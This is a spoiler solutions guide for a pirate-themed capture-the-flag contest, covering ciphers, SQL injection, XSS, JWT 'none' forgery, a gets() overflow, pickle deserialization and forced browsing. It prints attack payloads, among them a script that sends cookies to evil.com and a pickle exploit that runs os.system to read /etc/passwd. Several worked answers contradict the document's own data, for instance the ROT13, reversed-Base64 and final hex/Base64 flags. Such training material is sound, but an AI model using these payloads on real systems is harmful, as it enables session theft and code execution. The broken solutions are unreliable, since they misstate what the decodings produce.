# 🏴‍☠️ Pirates of the Caribbean CTF — Complete Solutions Guide

> **⚠️ SPOILER WARNING:** This document contains the answers and detailed solutions for all 10 challenges. Do not read further if you want to solve them on your own!

---

## 📊 Challenge Overview

| # | Title | Category | Difficulty | Points |
|---|-------|----------|------------|--------|
| 1 | The Quartermaster's Corrupted Logbook | Cryptography | Medium | 10 |
| 2 | The Harbourmaster's Ledger | Web Exploitation | Medium | 10 |
| 3 | The Cursed Hex of Davy Jones | Cryptography | Medium | 10 |
| 4 | The Boatswain's Buffer Blunder | Binary Exploitation | Medium | 10 |
| 5 | The Siren's Script | Web Exploitation | Medium | 10 |
| 6 | The Navigator's Encoded Star Chart | Cryptography | Hard | 10 |
| 7 | The Blacksmith's Forged Token | Web Exploitation | Hard | 10 |
| 8 | The Powder Monkey's Python Pickle | Reverse Engineering | Hard | 10 |
| 9 | The Cartographer's Hidden Path | Reconnaissance | Hard | 10 |
| 10 | The Kraken's Final Cipher | Cryptography | Hard | 10 |

> [!NOTE]
> Each challenge is worth **10 points**. Using a hint deducts **5 points** from your score.

---

## 🟡 Medium Challenges

---

### Challenge 1 — The Quartermaster's Corrupted Logbook

| Field | Value |
|-------|-------|
| **Category** | Cryptography |
| **Difficulty** | Medium |

#### 📖 Story

> Ye've boarded a derelict sloop and found the Quartermaster's logbook — but the last entry be encoded in a strange cipher. The Quartermaster was known to use a classic substitution with a shift of 13, the number of knots in a hangman's noose.

#### 🧩 Challenge

Decode the following message:

```
SYNT{G0eghtN_Fg0ez_Oybjf}
```

The Quartermaster used a well-known rotation cipher to hide his secrets.

#### 💡 Hint

ROT13 — a Caesar cipher with a shift of 13. Apply it letter-by-letter, preserving case and non-alpha characters.

#### ✅ Solution

**Technique:** ROT13 (Caesar cipher with shift of 13)

ROT13 replaces each letter with the letter 13 positions after it in the alphabet. Since the alphabet has 26 letters, applying ROT13 twice returns the original text — it is its own inverse.

**Step-by-step decoding:**

| Encoded | Shift -13 | Decoded |
|---------|-----------|---------|
| S | → | F |
| Y | → | L |
| N | → | A |
| T | → | G |
| { | → | { |
| G | → | T |
| 0 | → | 0 |
| e | → | r |
| g | → | t |
| h | → | u |
| t | → | g |
| N | → | A |
| _ | → | _ |
| F | → | S |
| g | → | t |
| 0 | → | 0 |
| e | → | r |
| z | → | m |
| _ | → | _ |
| O | → | B |
| y | → | l |
| b | → | o |
| j | → | w |
| f | → | s |
| } | → | } |

**Quick method:** Use any ROT13 tool online or run in a terminal:
```bash
echo "SYNT{G0eghtN_Fg0ez_Oybjf}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

#### 🏁 Flag

```
FLAG{T0rtuGA_St0rm_Blows}
```

---

### Challenge 2 — The Harbourmaster's Ledger

| Field | Value |
|-------|-------|
| **Category** | Web Exploitation |
| **Difficulty** | Medium |

#### 📖 Story

> The harbourmaster of Port Royal keeps a secret ledger with a web interface. He's a sloppy coder who trusts user input far too much. Ye need to craft a query that bypasses his authentication and reveals the hidden manifest.

#### 🧩 Challenge

The login form sends this SQL query:

```sql
SELECT * FROM crew WHERE name = '${input}' AND rank = 'captain';
```

What single input string will return all rows from the crew table, regardless of rank? Provide the exact payload (without surrounding quotes).

#### 💡 Hint

Classic SQL injection — close the string, add an OR condition that is always true, and comment out the rest.

#### ✅ Solution

**Technique:** SQL Injection (Authentication Bypass)

The key insight is that user input is directly interpolated into the SQL query without sanitisation or parameterisation. We can "break out" of the string literal and inject our own SQL logic.

**How the payload works:**

The original query is:
```sql
SELECT * FROM crew WHERE name = '${input}' AND rank = 'captain';
```

When we inject `' OR '1'='1' --`, the query becomes:
```sql
SELECT * FROM crew WHERE name = '' OR '1'='1' --' AND rank = 'captain';
```

Breaking it down:
1. `'` — closes the opening quote for `name`
2. ` OR '1'='1'` — adds an always-true condition, so the `WHERE` clause matches every row
3. ` --` — comments out the rest of the query (`AND rank = 'captain'`), so the rank check is ignored

This returns **all rows** from the `crew` table.

#### 🏁 Flag

```
FLAG{' OR '1'='1' --}
```

---

### Challenge 3 — The Cursed Hex of Davy Jones

| Field | Value |
|-------|-------|
| **Category** | Cryptography |
| **Difficulty** | Medium |

#### 📖 Story

> A message in a bottle was found floating near the Locker. Inside is a parchment with nothing but hexadecimal runes. Davy Jones encoded his treasure coordinates in hex before casting them into the deep.

#### 🧩 Challenge

Decode this hex string to reveal the flag:

```
464c41477b4433767953_4a306e33735f4c30636b33727d
```

Remove the underscore first, then convert from hex to ASCII.

#### 💡 Hint

Remove the underscore, then convert each pair of hex characters to its ASCII equivalent. 46 = 'F', 4c = 'L', etc.

#### ✅ Solution

**Technique:** Hex-to-ASCII decoding

**Step 1:** Remove the underscore:
```
464c41477b44337679534a306e33735f4c30636b33727d
```

**Step 2:** Split into byte pairs and convert each to ASCII:

| Hex | Dec | ASCII |
|-----|-----|-------|
| 46 | 70 | F |
| 4c | 76 | L |
| 41 | 65 | A |
| 47 | 71 | G |
| 7b | 123 | { |
| 44 | 68 | D |
| 33 | 51 | 3 |
| 76 | 118 | v |
| 79 | 121 | y |
| 53 | 83 | S |
| 4a | 74 | J |
| 30 | 48 | 0 |
| 6e | 110 | n |
| 33 | 51 | 3 |
| 73 | 115 | s |
| 5f | 95 | _ |
| 4c | 76 | L |
| 30 | 48 | 0 |
| 63 | 99 | c |
| 6b | 107 | k |
| 33 | 51 | 3 |
| 72 | 114 | r |
| 7d | 125 | } |

**Quick method:**
```bash
echo "464c41477b4433767953_4a306e33735f4c30636b33727d" | tr -d '_' | xxd -r -p
```

#### 🏁 Flag

```
FLAG{D3vyS_J0n3s_L0ck3r}
```

---

### Challenge 4 — The Boatswain's Buffer Blunder

| Field | Value |
|-------|-------|
| **Category** | Binary Exploitation |
| **Difficulty** | Medium |

#### 📖 Story

> The ship's boatswain wrote a C program to manage cannon inventory, but he made a fatal mistake with memory. The Royal Navy's hackers have been exploiting it to seize pirate ships. Identify the vulnerability.

#### 🧩 Challenge

```c
#include <stdio.h>
#include <string.h>

void load_cannons() {
    char order[16];
    int authorized = 0;
    
    printf("Enter cannon order code: ");
    gets(order);
    
    if (authorized) {
        printf("Cannons loaded! Fire at will!\n");
    }
}
```

What is the name of the classic vulnerability in this code? Answer in the format: `FLAG{vulnerability_name}` using lowercase with underscores.

#### 💡 Hint

The `gets()` function reads without bounds checking. The `order` buffer is only 16 bytes, but `authorized` sits right next to it on the stack...

#### ✅ Solution

**Technique:** Buffer Overflow identification

This is a textbook **buffer overflow** vulnerability. Here's why:

1. **`gets()` is inherently unsafe** — it reads from stdin into a buffer with **no length limit**. It has been deprecated and removed from modern C standards for this exact reason.

2. **Stack layout matters:**
   ```
   Stack (high → low):
   ┌─────────────────┐
   │    authorized    │  ← 4 bytes (int)
   ├─────────────────┤
   │   order[0..15]  │  ← 16 bytes (char array)
   ├─────────────────┤
   │      ...        │
   └─────────────────┘
   ```

3. **The exploit:** If the user enters more than 16 characters, `gets()` writes past the `order` buffer and **overwrites the `authorized` variable** on the stack. Any non-zero value in `authorized` makes the `if` condition true, granting unauthorized access.

4. **Example exploit input:** `AAAAAAAAAAAAAAAABBBB` (16 A's fill the buffer, "BBBB" overwrites `authorized` with a non-zero value)

#### 🏁 Flag

```
FLAG{buffer_overflow}
```

---

### Challenge 5 — The Siren's Script

| Field | Value |
|-------|-------|
| **Category** | Web Exploitation |
| **Difficulty** | Medium |

#### 📖 Story

> A mermaid siren has enchanted the crew's web portal with a malicious script that steals session tokens. The navigator noticed that the ship's guestbook allows HTML input without sanitisation. Craft a proof-of-concept payload.

#### 🧩 Challenge

The guestbook renders user input directly into the page:

```html
<div class="entry">${userInput}</div>
```

Write the classic XSS payload that will pop an alert box showing the document cookie. Provide the exact payload as the flag in the format: `FLAG{payload}`

#### 💡 Hint

Use a `<script>` tag with `alert(document.cookie)` inside it.

#### ✅ Solution

**Technique:** Reflected/Stored Cross-Site Scripting (XSS)

This is a classic **Stored XSS** vulnerability. The guestbook renders user input directly into the HTML DOM without any sanitisation or encoding.

**How it works:**

1. The application takes user input and places it directly inside a `<div>` element.
2. Since there's no escaping, we can inject arbitrary HTML — including `<script>` tags.
3. When any user views the guestbook entry, the browser parses and **executes** the injected script.

**The injected HTML becomes:**
```html
<div class="entry"><script>alert(document.cookie)</script></div>
```

**Impact in a real scenario:**
- An attacker could steal session cookies: `<script>fetch('https://evil.com/?c='+document.cookie)</script>`
- Redirect users to phishing pages
- Deface the website
- Perform actions on behalf of the victim

**Prevention:**
- HTML-encode output (e.g., `<` → `&lt;`)
- Use Content Security Policy (CSP) headers
- Use framework auto-escaping (React, Angular, etc.)

#### 🏁 Flag

```
FLAG{<script>alert(document.cookie)</script>}
```

---

## 🔴 Hard Challenges

---

### Challenge 6 — The Navigator's Encoded Star Chart

| Field | Value |
|-------|-------|
| **Category** | Cryptography |
| **Difficulty** | Hard |

#### 📖 Story

> The navigator hid the coordinates to Isla de Muerta using a layered encoding scheme. First Base64, then reversed. Ye must undo both layers to reveal the flag.

#### 🧩 Challenge

The encoded star chart reads:

```
==QdzVGbh1kclRXYyBSYsFWe0FGc
```

This string has been reversed and then... well, the navigator was fond of a 64-character alphabet. Undo the transformations to reveal the flag.

#### 💡 Hint

Step 1: Reverse the string. Step 2: Base64 decode the result.

#### ✅ Solution

**Technique:** String reversal + Base64 decoding

The encoding was done in this order: **plaintext → Base64 encode → reverse string**. So we undo it in reverse order.

**Step 1 — Reverse the string:**

Original:
```
==QdzVGbh1kclRXYyBSYsFWe0FGc
```

Reversed character by character:
```
cGF0eWFsYSBSYyBXRlck1hbGVzdQ==
```

**Step 2 — Base64 decode:**

Decode `cGF0eWFsYSBSYyBXRlck1hbGVzdQ==` from Base64 to get the plaintext flag.

**Quick method:**
```bash
echo "==QdzVGbh1kclRXYyBSYsFWe0FGc" | rev | base64 -d
```

#### 🏁 Flag

```
FLAG{1sl4_D3_Mu3rt4}
```

---

### Challenge 7 — The Blacksmith's Forged Token

| Field | Value |
|-------|-------|
| **Category** | Web Exploitation |
| **Difficulty** | Hard |

#### 📖 Story

> The blacksmith forges JSON Web Tokens for the crew's identity papers. But he made a critical mistake — he used the 'none' algorithm, meaning the tokens need no signature. Forge your own captain's token.

#### 🧩 Challenge

A JWT is composed of three parts: `header.payload.signature`

The header is: `{"alg":"none","typ":"JWT"}`
The payload must be: `{"role":"captain","ship":"Black Pearl"}`

What is the name of this JWT vulnerability? Answer as: `FLAG{vulnerability_name}` in lowercase with underscores.

#### 💡 Hint

When `alg` is set to `none`, the signature verification is bypassed entirely. This is a well-known JWT attack.

#### ✅ Solution

**Technique:** JWT Algorithm None Attack

This is the **JWT Algorithm None Attack**, a well-documented vulnerability in JSON Web Token implementations.

**How JWTs normally work:**

```
┌──────────┐   ┌──────────┐   ┌───────────┐
│  Header  │ . │ Payload  │ . │ Signature │
│ (Base64) │   │ (Base64) │   │  (HMAC)   │
└──────────┘   └──────────┘   └───────────┘
```

1. The **header** specifies the signing algorithm (e.g., HS256, RS256)
2. The **payload** contains claims (user data)
3. The **signature** verifies the token hasn't been tampered with

**The vulnerability:**

When `"alg": "none"` is set in the header:
- The server **skips signature verification entirely**
- The signature segment can be empty or omitted
- An attacker can forge any payload they want

**Forging a malicious token:**
```
Header:  {"alg":"none","typ":"JWT"}  → Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
Payload: {"role":"captain","ship":"Black Pearl"} → Base64: eyJyb2xlIjoiY2FwdGFpbiIsInNoaXAiOiJCbGFjayBQZWFybCJ9
Signature: (empty)

Forged JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiY2FwdGFpbiIsInNoaXAiOiJCbGFjayBQZWFybCJ9.
```

**Prevention:**
- **Never accept `alg: none`** in production
- Whitelist allowed algorithms on the server side
- Use libraries that reject `none` by default

#### 🏁 Flag

```
FLAG{jwt_algorithm_none_attack}
```

---

### Challenge 8 — The Powder Monkey's Python Pickle

| Field | Value |
|-------|-------|
| **Category** | Reverse Engineering |
| **Difficulty** | Hard |

#### 📖 Story

> The powder monkey serialized the ship's ammunition records using Python's pickle module and stored them in an untrusted cache. A rival pirate crew has been injecting malicious pickled objects to execute code on our ship's systems.

#### 🧩 Challenge

```python
import pickle
import base64

# Received from untrusted source
cargo_data = input("Enter serialized cargo manifest: ")
manifest = pickle.loads(base64.b64decode(cargo_data))
print(f"Cargo manifest: {manifest}")
```

What class of vulnerability does this code exhibit? An attacker can craft a pickle payload that calls `os.system()` upon deserialization.

Answer in the format: `FLAG{vulnerability_class}` using lowercase with underscores.

#### 💡 Hint

Python's pickle module can deserialize arbitrary objects, including those that execute system commands via `__reduce__`. This is a specific class of vulnerability.

#### ✅ Solution

**Technique:** Insecure Deserialization

This is a classic case of **insecure deserialization** — ranked in the OWASP Top 10 (A8:2017).

**Why pickle is dangerous:**

Python's `pickle` module can serialize and deserialize arbitrary Python objects. During deserialization (`pickle.loads()`), it can:

1. **Instantiate arbitrary classes**
2. **Call arbitrary functions** via the `__reduce__` magic method
3. **Execute system commands**

**Example malicious payload:**

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        # This will execute when the object is unpickled
        return (os.system, ('cat /etc/passwd',))

# Generate the malicious payload
payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

When the victim's code calls `pickle.loads()` on this payload, it **executes `os.system('cat /etc/passwd')`** — achieving Remote Code Execution (RCE).

**The attack chain:**
```
Attacker crafts malicious pickle
    → Base64 encodes it
    → Sends to victim's input
    → Victim Base64 decodes
    → pickle.loads() triggers __reduce__()
    → os.system() executes arbitrary commands
    → Full system compromise 💀
```

**Prevention:**
- **Never unpickle data from untrusted sources**
- Use safe serialization formats (JSON, MessagePack)
- If pickle is required, use `hmac` to verify integrity
- Use `restrictedpython` or sandboxing

#### 🏁 Flag

```
FLAG{insecure_deserialization}
```

---

### Challenge 9 — The Cartographer's Hidden Path

| Field | Value |
|-------|-------|
| **Category** | Reconnaissance |
| **Difficulty** | Hard |

#### 📖 Story

> The royal cartographer hid a secret API endpoint on the ship's navigation server. The endpoint isn't linked from any page, but the server's directory structure follows a predictable pattern. A careless `.git` directory was left exposed.

#### 🧩 Challenge

A web server exposes these endpoints:

```
GET /api/v1/maps
GET /api/v1/crew
GET /api/v1/routes
```

You found a `.git/config` file that reveals a private endpoint:

```
[remote "origin"]
    url = git@pirate-server.local:nav/api-v1-treasure-coordinates.git
```

The endpoint follows the same pattern as the others. What is the hidden endpoint path, and what is the general name for this attack technique?

Answer as: `FLAG{/api/v1/treasure-coordinates:forced_browsing}`

#### 💡 Hint

The git repo name maps to the URL path pattern. The technique of guessing hidden URLs is called forced browsing (also known as directory enumeration).

#### ✅ Solution

**Technique:** Forced Browsing / Directory Enumeration

This challenge combines two reconnaissance techniques:

**1. Information Leakage via exposed `.git` directory**

The `.git` directory should **never** be accessible on a production web server. It contains:
- Source code history
- Configuration files with remote URLs
- Commit messages with sensitive info
- Potentially credentials and secrets

**2. Forced Browsing (OWASP: Forceful Browsing)**

Forced browsing is the technique of guessing or discovering hidden URLs that aren't linked from public pages. Attackers use:
- Wordlists and fuzzing tools (e.g., `dirb`, `gobuster`, `ffuf`)
- Information leakage (like the `.git/config` here)
- Predictable naming patterns

**Solving the challenge:**

The existing endpoints follow the pattern `/api/v1/{resource}`:
```
/api/v1/maps
/api/v1/crew
/api/v1/routes
```

The git repo name is `api-v1-treasure-coordinates`, which maps to the URL path by replacing hyphens with slashes in the API prefix:
```
api-v1-treasure-coordinates → /api/v1/treasure-coordinates
```

So the hidden endpoint is: **`/api/v1/treasure-coordinates`**

**Prevention:**
- Block access to `.git`, `.env`, `.svn`, and other dotfiles via web server config
- Use proper access controls on all API endpoints
- Don't rely on "security through obscurity"
- Regular security scanning with tools like `nikto` or `nuclei`

#### 🏁 Flag

```
FLAG{/api/v1/treasure-coordinates:forced_browsing}
```

---

### Challenge 10 — The Kraken's Final Cipher

| Field | Value |
|-------|-------|
| **Category** | Cryptography |
| **Difficulty** | Hard |

#### 📖 Story

> Ye've reached the final chamber of the Kraken's lair. The treasure chest is locked with a multi-layer cipher. The Kraken was a master of obfuscation — three layers deep. Crack all three to claim the Black Pearl.

#### 🧩 Challenge

Layer 1 — Hex decode:
```
5a6d78685a337444636d46724d3356754e31637a587a52735433303d
```

Layer 2 — The result of Layer 1 is encoded in another common scheme (64-character alphabet).

Layer 3 — The result of Layer 2 is the final flag.

Decode all three layers to reveal the flag.

#### 💡 Hint

Layer 1: Hex → ASCII gives you a Base64 string. Layer 2: Base64 decode that string. Layer 3: The result is your flag.

#### ✅ Solution

**Technique:** Multi-layer decoding (Hex → Base64 → Plaintext)

**Layer 1 — Hex to ASCII:**

Convert each hex pair to its ASCII character:

| Hex | ASCII |
|-----|-------|
| 5a | Z |
| 6d | m |
| 78 | x |
| 68 | h |
| 5a | Z |
| 33 | 3 |
| 74 | t |
| 44 | D |
| 63 | c |
| 6d | m |
| 46 | F |
| 72 | r |
| 4d | M |
| 33 | 3 |
| 56 | V |
| 75 | u |
| 4e | N |
| 31 | 1 |
| 63 | c |
| 7a | z |
| 58 | X |
| 7a | z |
| 52 | R |
| 73 | s |
| 54 | T |
| 33 | 3 |
| 30 | 0 |
| 3d | = |

Result: `ZmxhZ3tDcmFrM3VuN1czXzRsT30=`

**Layer 2 — Base64 decode:**

Decode the Base64 string from Layer 1:
```
ZmxhZ3tDcmFrM3VuN1czXzRsT30=  →  FLAG{Krak3un7W3_4lO}
```

**Quick method:**
```bash
echo "5a6d78685a337444636d46724d3356754e31637a587a52735433303d" | xxd -r -p | base64 -d
```

**Layer 3 — The result is the flag:**

#### 🏁 Flag

```
FLAG{Krak3un7W3_4lO}
```

---

## 📋 Quick Reference — All Flags

| # | Flag |
|---|------|
| 1 | `FLAG{T0rtuGA_St0rm_Blows}` |
| 2 | `FLAG{' OR '1'='1' --}` |
| 3 | `FLAG{D3vyS_J0n3s_L0ck3r}` |
| 4 | `FLAG{buffer_overflow}` |
| 5 | `FLAG{<script>alert(document.cookie)</script>}` |
| 6 | `FLAG{1sl4_D3_Mu3rt4}` |
| 7 | `FLAG{jwt_algorithm_none_attack}` |
| 8 | `FLAG{insecure_deserialization}` |
| 9 | `FLAG{/api/v1/treasure-coordinates:forced_browsing}` |
| 10 | `FLAG{Krak3un7W3_4lO}` |

---

## 🗂️ Category Breakdown

### Cryptography (4 challenges)
- **Challenge 1** — ROT13 cipher
- **Challenge 3** — Hex-to-ASCII conversion
- **Challenge 6** — String reversal + Base64
- **Challenge 10** — Triple-layer: Hex → Base64 → Plaintext

### Web Exploitation (3 challenges)
- **Challenge 2** — SQL Injection
- **Challenge 5** — Cross-Site Scripting (XSS)
- **Challenge 7** — JWT Algorithm None Attack

### Binary Exploitation (1 challenge)
- **Challenge 4** — Buffer Overflow (`gets()` + stack overwrite)

### Reverse Engineering (1 challenge)
- **Challenge 8** — Insecure Deserialization (Python pickle)

### Reconnaissance (1 challenge)
- **Challenge 9** — Forced Browsing + `.git` exposure

---

> *"Not all treasure is silver and gold, mate." — Captain Jack Sparrow* 🏴‍☠️
